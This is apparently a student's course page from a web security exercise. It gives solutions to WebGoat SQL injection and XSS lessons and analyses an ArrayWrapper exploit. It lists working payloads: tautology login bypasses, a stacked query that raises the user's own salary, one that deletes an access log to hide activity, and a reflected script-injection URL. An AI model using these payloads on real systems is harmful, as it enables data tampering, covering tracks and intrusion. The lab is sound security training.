<!DOCTYPE html>
<html>
<head>
	<title> Domenic Overview 12</title>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" href="../Ressource/Style/prism.css">
	<link rel="stylesheet" href="../Ressource/Style/SummaryStyle.css">
	<script src="../Ressource/Style/prism.js"></script>
</head>
<body style="background-color:#D4F0D0">
	<script src="../Headerscript.js" async></script>
	<link rel="stylesheet" href="../mystyle.css">
	<header id="Header">
		<a href="../index.html"><img alt="Logo" src="../Ressource/Default_Logo.svg" width=100px height= 100px /></a> 
		<div class="NavContainer">
			<a href="../Uebung1/Overview.html" class="link navA">1. Einführung</a> 
			<a href="../Uebung2/Overview.html" class="link navA">2. Responsives Web</a>
			<a href="../Uebung3/Overview.html" class="link navA">3. JavaScript</a>
			<a href="../Uebung4/Overview.html" class="link navA">4. DOM</a>
			<a href="../Uebung5/Overview.html" class="link navA">5. Asynchron</a>
			<a href="../Uebung6/Overview.html" class="link navA">6. SVG</a>
			<a href="../Uebung7/Overview.html" class="link navA">7. Node & npm & Deno</a>
			<a href="../Uebung8/Overview.html" class="link navA">8. Modular Web</a>
			<a href="../Uebung9/Overview.html" class="link navA">9. PWA</a>
			<a href="../Uebung10/Overview.html" class="link navA">10. VUE</a>
			<a href="../Uebung11/Overview.html" class="link navA">11. WebAssembly</a>
			<a href="../Uebung12/Overview.html" class="link navA">12. Security</a>
			<a href= "http://www2.inf.h-brs.de/~dzens2s/Storybook" class="link navA">Hier geht es zum Storybook</a>
			<a onclick="history.back()" class="link navA back" style="margin-left: auto;">Zurück</a>
			</div>
	</header>
	<div class="content" style="margin: 15px" id="app"> 
		<div id="Array">
			<h1>ArrayWrapper</h1>
			<p>In dieser Aufgabe wurde auf ein Exploit eines ArrayWrapper hingewiesen, der in der Vorlesung präsentiert wurde.</p>
			<details>
			<summary> Ursachenanalyse und Sicherheitskonzept </summary>
			  Durch das nachträgliche hinzufügen der Push Methode, kann die Aktion welche bei der Function "append" aufgerufen wird, geändert werden. <br> <br>
			  Um nicht eine Funktion hinzufügen zu können, kann auf das Aufrufen von externen Funktionen verzichtet werden. Um dies zu verhindern kann eine interne versteckte Funktion geschrieben werden oder am Anfang gesetzt werden. Desweiteren können die Parameter gewhitlister werden und somit nur positive Zahlen zugelassen werden.
			</details>
		  
		  
			<details>
			<summary> Source Code ArrayWrapperNeu.js</summary>
		  
		  
			<pre>
				  <code class="language-javascript">
				  function demethodize(f)
				  {
				  return function(x,y)
				  {
					  return f.call(x,y);
				  }
				  }
		  
		  
				  function arrayWrapper(){
				  var array= ["Peter","Karl"]
				  var push = demethodize(array.push);
					  return {
					  get:function(pos){
					  return array[pos];
					  },
						  set:function(pos,val){
							  if(typeof pos == 'number')
								  if(pos>=0)
									  array[pos] = val;
					  },
						  append:function(val){
					  push(array,val)
					  }
				  }
				  }
					
				  
				  </code>
			  </pre>
			  </details>

		</div>


		<div id="A1">
			
		
		<h1>Webgoat A1</h1>
		
			<details>
			<summary> Look at the example table. Try to retrieve the department of the employee Bob Franco. Note that you have been granted full administrator privileges in this assignment and can access all data without authentication.</summary>
			<pre>
				<code class="language-sql">
				select department from employees where first_name = 'Bob' And last_name='Franco' </code>
			</pre>
			</details>
		
			<details>
			<summary> Try to change the department of Tobi Barnett to 'Sales'. Note that you have been granted full administrator privileges in this assignment and can access all data without authentication.</summary>
			<pre>
				<code class="language-sql">
				update employees set department = 'Sales' where first_name = 'Tobi' and last_name = 'Barnett' </code>
			</pre>
			</details>

			<details>
			<summary> Now try to modify the schema by adding the column \"phone\" (varchar(20)) to the table \"employees\".</summary>
			<pre>
				<code class="language-sql">
				alter table employees add phone varchar(20)</code>
			</pre>
			</details>

			<details>
			<summary> Try to grant rights to the table grant_rights to user unauthorized_user</summary>
			<pre>
				<code class="language-sql">
				grant all on grant_rights to unauthorized_user </code>
			</pre>
			</details>

			<details>
			<summary> Try using the form below to retrieve all the users from the users table. You should not need to know any specific user name to get the complete list.</summary>
			<pre>
				<code class="language-sql">
				select * from user_data where first_name = 'John' and last_name = 'Smith' or '1' = '1' </code>
			</pre>
			</details>
			
			<details>
			<summary> Using the two Input Fields below, try to retrieve all the data from the users table.</summary>
			<pre>
				<code class="language-sql">
				\\"SELECT * FROM employees WHERE last_name = '\\" + Smith + \\"' AND auth_tan = '\\" + 3SL99A' or '1' = ' 1 + \\"'\\"; </code>
			</pre>
			<label> Login_Count: </label>
			<input type="text" value="100" disabled>
			<label> User_Id: </label>
			<input type="text" value="100 or true" disabled>
			</details>


			<details>
			<summary> Use the form below and try to retrieve all employee data from the employees table. You should not need to know any specific names or TANs to get the information you need. You already found out that the query performing your request looks like this\\n \\n  \\"SELECT * FROM employees WHERE last_name = '\\" + name + \\"' AND auth_tan = '\\" + auth_tan + \\"'\\";</summary>
			<pre>
				<code class="language-sql">
				\\"SELECT * FROM employees WHERE last_name = '\\" + Smith + \\"' AND auth_tan = '\\" + 3SL99A' or '1' = ' 1 + \\"'\\";</code>
			</pre>
			<label> Employee Name: </label>
			<input type="text" value="Smith" disabled>
			<label> Authentication TAN: </label>
			<input type="text" value="3SL99A' or '1' = ' 1" disabled>
			</details>

			<details>
			<summary> You just found out that Tobi and Bob both seem to earn more money than you! Of course you cannot leave it at that. \n Better go and change your own salary so you are earning the most!</summary>
			
			<label> Employee Name: </label>
			<input type="text" value="Smith" disabled>
			<label> Authentication TAN: </label>
			<input type="text" value="3SL99A'; update employees SET salary=(SELECT MAX(Salary)+1 FROM employees) where Last_Name='Smith" disabled style="width: 700px">
			</details>
			<details>
			<summary> Now you are the top earner in your company. But do you see that? There seems to be a access_log table, where all your actions have been logged to! \n Better go and delete it completely before anyone notices.</summary>
			
			<label> Action contains: </label>
			<input type="text" value="SELECT'; delete from access_log; SELECT * FROM access_log WHERE Action like '" disabled>
			</details>
		</div>

		<div id="A7">
			
		<h1></h1>
		<h1>Webgoat A7</h1>
		
		
			<details>
			<summary> Open a second tab and use the same url as this page you are currently on (or any url within this instance of WebGoat) \n Then, on that second that open the browser developer tools and open the javascript console. And type: alert(document.cookie);</summary>
			<pre>
				<code class="language-sql">
				yes </code>
			</pre>
			</details>
		
			<details>
			<summary> An easy way to find out if a field is vulnerable to an XSS attack is to use the alert() or console.log() methods. Use one of them to find out which field is vulnerable.</summary>
			<label> Enter your credit card number </label>
			<input type="text" value='&lt;script&gt;alert(\\"Hey\\")&lt;/script&gt;' disabled style="width: 200px">
			</details>

			<details>
			<summary> So, what is the route for the test code that stayed in the app during production? To answer this question, you have to check the JavaScript source.</summary>
			<pre>
				<code class="language-sql">
				start.mvc#test</code>
			</pre>
			</details>

			<details>
			<summary> Some attacks are \"blind\". Fortunately, you have the server running here so you will be able to tell if you are successful. Use the route you just found and see if you can use the fact that it reflects a parameter from the route without encoding to execute an internal function in WebGoat. The function you want to execute is …​ \n \n webgoat.customjs.phoneHome() \n \n Sure, you could just use console/debug to trigger it, but you need to trigger it via a URL in a new tab. \n Once you do trigger it, a subsequent response will come to your browser’s console with a random number. Put that random number in below.</summary>
			<pre>
				<code class="language-sql">
				http://localhost:8080/WebGoat/start.mvc#test/%3Cscript%3Econsole.log(webgoat.customjs.phoneHome())%3Cscript%3E</code>
			</pre>
			</details>


			<details>
			<summary> Quiz: Are trusted websites immune to XSS attacks?</summary>
			<pre>
				<code class="language-sql">
				Solution 4: No because the browser trusts the website if it is acknowledged trusted, then the browser does not know that the script is malicious.</code>
			</pre>
			</details>

			<details>
			<summary> Quiz: When do XSS attacks occur?</summary>
			<pre>
				<code class="language-sql">
				Solution 3: The data is included in dynamic content that is sent to a web user without being validated for malicious content </code>
			</pre>
			</details>
			
			<details>
			<summary> Quiz: What are Stored XSS attacks?</summary>
			<pre>
				<code class="language-sql">
				Solution 1: The script is permanently stored on the server and the victim gets the malicious script when requesting information from the server </code>
			</pre>
			</details>


			<details>
			<summary> Quiz: What are Reflected XSS attacks?</summary>
			<pre>
				<code class="language-sql">
				Solution 2: They reflect the injected script off the web server. That occurs when input sent to the web server is part of the request.</code>
			</pre>
			</details>

			<details>
			<summary> Quiz: Is JavaScript the only way to perform XSS attacks?</summary>
			<pre>
				<code class="language-sql">
				Solution 3: No there is ECMAScript too.</code>
			</pre>
			
			</details>

		</div>
		


		

	</div>
	<style>
		.inner_content{
			display: grid;
			grid-template-columns: 1fr 1fr;
		}
	</style>
</body>


</html>

